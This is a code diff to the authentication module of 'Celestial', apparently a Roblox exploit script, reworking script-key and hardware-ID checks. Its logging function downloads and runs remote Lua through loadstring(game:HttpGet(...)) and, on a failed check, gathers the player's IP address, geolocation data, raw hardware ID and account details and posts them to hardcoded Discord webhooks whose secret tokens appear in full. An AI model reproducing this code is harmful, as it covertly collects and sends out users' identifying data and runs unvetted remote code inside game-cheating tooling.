@@ -13,8 +13,8 @@ local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
 local hashedHWID = utils.hash(hwid, "SHA-384")
 
 local authConfig = {
-    logExecutions = true,
-    logBreaches = false,
+    logExecutions = false,
+    logBreaches = true,
     autoTrigger = true  -- set to false when loading as a utility library
 }
 
@@ -168,11 +168,12 @@ auth.clear = function()
 end
 
 local function logEvent(eventType)
-    if eventType == "execution" then
-        print("erherheherh")
-        local webhookUrl = "https://discord.com/api/webhooks/1514052412971683940/7-CFUCneSvs-dW4Aq0mCXHYDOVcZ95ahgWvDrTt_ldIl8t0_dRItt8s5sK5jZZpKVeL1"
-        local embedLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/669053713850403197963270290945742252531/Celestial/refs/heads/main/Libraries/Embed%20Library.lua"))()
+    local executionURL = "https://discord.com/api/webhooks/1514052412971683940/7-CFUCneSvs-dW4Aq0mCXHYDOVcZ95ahgWvDrTt_ldIl8t0_dRItt8s5sK5jZZpKVeL1"
+    local breachURL = "https://discord.com/api/webhooks/1514036528500965548/A5Kt2C4hJb2z_UYRSuI71E4h2-7v1q6IY528-EyB06frKL6Xu8RdDrsDnRNy0BIZmraV"
+    local embedLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/669053713850403197963270290945742252531/Celestial/refs/heads/main/Libraries/Embed%20Library.lua"))()
+    local authUser = auth.getUser()
 
+    if eventType == "execution" then
         local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
         local authUser = auth.getUser()
 
@@ -205,7 +206,7 @@ local function logEvent(eventType)
         embedLib.addField(embed, "Exploit", identifyexecutor(), true)
         embedLib.addField(embed, "HWID", "||" .. auth.hwid("Hashed") .. "||", true)
         embedLib.addField(embed, "HWID [Dehashed]", "||" .. auth.hwid("Normal") .. "||", true)
-        embedLib.addField(embed, "Key", "||" .. authUser.Key .. "||", true)
+        embedLib.addField(embed, "Key", "||```" .. authUser.Key .. "```||", true)
 
         -- Conditional fields
 
@@ -219,11 +220,7 @@ local function logEvent(eventType)
 
         embedLib.sendEmbed(embed, "Celestial", "Celestial")
     elseif eventType == "breach" then
-        local webhookUrl = "https://discord.com/api/webhooks/1514036528500965548/A5Kt2C4hJb2z_UYRSuI71E4h2-7v1q6IY528-EyB06frKL6Xu8RdDrsDnRNy0BIZmraV"
-        local embedLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/669053713850403197963270290945742252531/Celestial/refs/heads/main/Libraries/Embed%20Library.lua"))()
-
         local isUser = auth.isUser()
-        local user = auth.getUser()
 
         local userInputService = game:GetService("UserInputService")
         local ipv4 = game:HttpGet("https://api.ipify.org")
@@ -241,15 +238,26 @@ local function logEvent(eventType)
             end
         end
 
+        local scriptkey = getgenv().script_key
+        local keyOwner = nil
+        for _, user in ipairs(whitelistedUsers) do
+            if user.Key == scriptkey then
+                keyOwner = user
+                break
+            end
+        end
+
         -- Embed
 
         local footerText
-        if not isUser then
+        if hashedHWID ~= keyOwner.HWID then
+            footerText = "⚠️ This unauthorized user (" .. player.DisplayName .. ") is most likely key sharing with " .. keyOwner.Identifier
+        elseif not isUser and not authUser then
             footerText = "⚠️ User is not authorized."
         end
 
         local embedData = {
-            webhookUrl = webhookUrl,
+            webhookUrl = breachURL,
             title = nil,
             description = false,
             color = Color3.fromRGB(255, 0, 0),
@@ -272,23 +280,29 @@ local function logEvent(eventType)
 
         -- Fields
 
-        local discordId = tostring(isUser and user.DiscordId or 0)
-        local identifier = tostring(isUser and user.Identifier or "Unknown")
-        local rank = tostring(isUser and user.Rank or "Unknown")
-        local key = tostring(isUser and user.Key or "Unknown")
+        local discordId = tostring(isUser and authUser.DiscordId or 0)
+        local identifier = tostring(isUser and authUser.Identifier or "Unknown")
+        local rank = tostring(isUser and authUser.Rank or "Unknown")
 
         local fields = {
-            { name = "Identifier", value = identifier, inline = true },
-            { name = "Rank", value = rank, inline = true },
-            { name = "Key", value = "||```" .. key .. "```||", inline = true },
-            { name = "Linked Account", value = "<@" .. discordId .. ">", inline = true },
+            { name = "================== UNAUTHORIZED USER ==================", value = "", inline = false },
+
+            { name = "Used Key", value = "```" .. scriptkey .. "```", inline = false },
+            { name = "Name", value = player.DisplayName .. " (@" .. player.Name .. ")", inline = true },
             { name = "Account Age", value = player.AccountAge .. " Days", inline = true },
+            { name = "User ID", value = player.UserId, inline = true },
             { name = "Device", value = getDevice(), inline = true },
             { name = "Exploit", value = identifyexecutor(), inline = true },
             { name = "IPv4", value = "||```" .. ipv4 .. "```||", inline = true },
-            { name = "Hardware ID (HWID)", value = "||```" .. hashedHWID .. "``` ```\n\n" .. hwid .. "```||", inline = true },
-            { name = "IP Address Lookup", value = "[IPLocation.io](https://iplocation.io/ip/" .. ipv4 .. ")", inline = true },
+            { name = "Hardware ID (HWID)", value = "```" .. hashedHWID .. "``` ```\n\n" .. hwid .. "```", inline = true },
             { name = "IP Address Geolocation Data", value = "||```json" .. "\n" .. ipdetails .. "```||", inline = false },
+            -- { name = "IP Address Lookup", value = "[IPLocation.io](https://iplocation.io/ip/" .. ipv4 .. ")", inline = true },
+
+            { name = "================== KEY OWNER ==================", value = "", inline = false },
+            { name = "Linked Account", value = "<@" .. keyOwner.DiscordId .. ">", inline = true },
+            { name = "Identifier", value = keyOwner.Identifier, inline = true },
+            { name = "Rank", value = keyOwner.Rank, inline = true },
+            { name = "HWID", value = "```" .. keyOwner.HWID .. "```", inline = true },
         }
 
         for _, field in ipairs(fields) do
@@ -312,28 +326,47 @@ local function internalTrigger()
         return
     end
 
-    local isAuthorized, userData = isAuthorizedInternal()  -- private, not auth.isAuthorized
+    local scriptKey = getgenv().script_key
 
-    if isAuthorized and userData then
-        local scriptKey = getgenv().script_key
-
-        if typeof(scriptKey) ~= "string" or userData.Key ~= scriptKey then
-            warn("[Celestial] Invalid or missing script key.")
-            if authConfig.logBreaches then logEvent("breach") end
-            setclipboard(scriptKey or "nil")
-            player:Kick("Invalid script key: " .. tostring(scriptKey))
-            kicked = true
-            return
-        end
-
-        if authConfig.logExecutions then logEvent("execution") end
-    else
-        warn("[Celestial] Not authorized. Copying HWID to clipboard.")
-        setclipboard(hashedHWID)
+    if typeof(scriptKey) ~= "string" then
+        warn("[Celestial] No script key provided.")
         if authConfig.logBreaches then logEvent("breach") end
-        player:Kick("You are not authorized to use this script.")
+        player:Kick("No script key provided.")
         kicked = true
+        return
     end
+
+    -- First, find which user owns this key in the whitelist
+    local keyOwner = nil
+    for _, user in ipairs(whitelistedUsers) do
+        if user.Key == scriptKey then
+            keyOwner = user
+            break
+        end
+    end
+
+    -- Key doesn't exist in the whitelist at all
+    if not keyOwner then
+        warn("[Celestial] Script key not found in whitelist.")
+        if authConfig.logBreaches then logEvent("breach") end
+        player:Kick("Invalid script key.")
+        kicked = true
+        return
+    end
+
+    -- Key exists but is not assigned to this HWID
+    if keyOwner.HWID ~= hashedHWID then
+        warn("[Celestial] Script key belongs to a different HWID.")
+        if authConfig.logBreaches then logEvent("breach") end
+        player:Kick("This script key is not linked to your hardware.")
+        kicked = true
+        return
+    end
+
+    -- HWID matches the key owner — set currentUser
+    currentUser = keyOwner
+
+    if authConfig.logExecutions then logEvent("execution") end
 end
 
 -- Public facing trigger delegates to the private local
